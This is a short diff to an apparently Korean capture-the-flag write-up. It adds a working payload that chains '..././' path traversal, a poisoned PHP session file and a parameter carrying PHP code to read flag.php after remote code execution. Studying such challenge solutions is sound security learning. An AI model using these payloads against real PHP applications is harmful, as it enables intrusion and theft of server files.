@@ -111,7 +111,9 @@ ex) ``PHPSESSID=fqs54b8ies3uhuhlttlb3lq3d0html``
   
 ``?p=..././..././..././..././..././var/lib/php/sessions/fqs54b8ies3uhuhlttlb3lq3d0html``  
   
-RCE가 성공적으로 되는걸 확인했다면, flag.php를 읽으면 된다.
+RCE가 성공적으로 되는걸 확인했다면, flag.php를 읽으면 된다.  
+  
+``?p=..././..././..././..././..././var/lib/php/sessions/fqs54b8ies3uhuhlttlb3lq3d0html&x=echo file_get_contents('flag.php');``
 
 ## sqlgame revenge (480pts) - solver (2)
 
